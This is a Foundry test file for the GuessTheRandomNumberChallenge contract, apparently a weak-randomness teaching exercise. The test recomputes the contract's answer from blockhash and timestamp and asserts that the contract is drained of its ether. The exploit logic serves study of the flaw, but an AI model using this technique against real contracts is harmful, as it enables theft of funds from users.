
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import "../src/GuessTheRandomNumberChallenge.sol";

contract TestWeakRandomnessGuessTheRandomNumberChallenge is Test {

    GuessTheRandomNumberChallenge public contractUnderTest;

    function setUp() public {
        contractUnderTest = new GuessTheRandomNumberChallenge{value: 1 ether}();
    }

    function test_highlightPredictableRandomValue(uint256 blockNumber, uint256 blockTimestamp) public {
        // --- 1. Constraints ---
        blockNumber = blockNumber + 1;
        blockTimestamp = blockTimestamp + 1;

        // --- 2. State Configuration ---
        vm.deal(address(this), 1 ether);

        // --- 3. Manipulate Block Environment ---
        vm.roll(blockNumber);
        vm.warp(blockTimestamp);

        // --- 4. Replication & Assertion ---
        uint8 expectedAnswer = uint8(uint256(keccak256(abi.encodePacked(blockhash(blockNumber - 1), blockTimestamp))));
        vm.prank(address(this));
        contractUnderTest.guess(expectedAnswer);

        assertEq(address(contractUnderTest).balance, 0, "Contract should be drained after correct guess");
    }
}
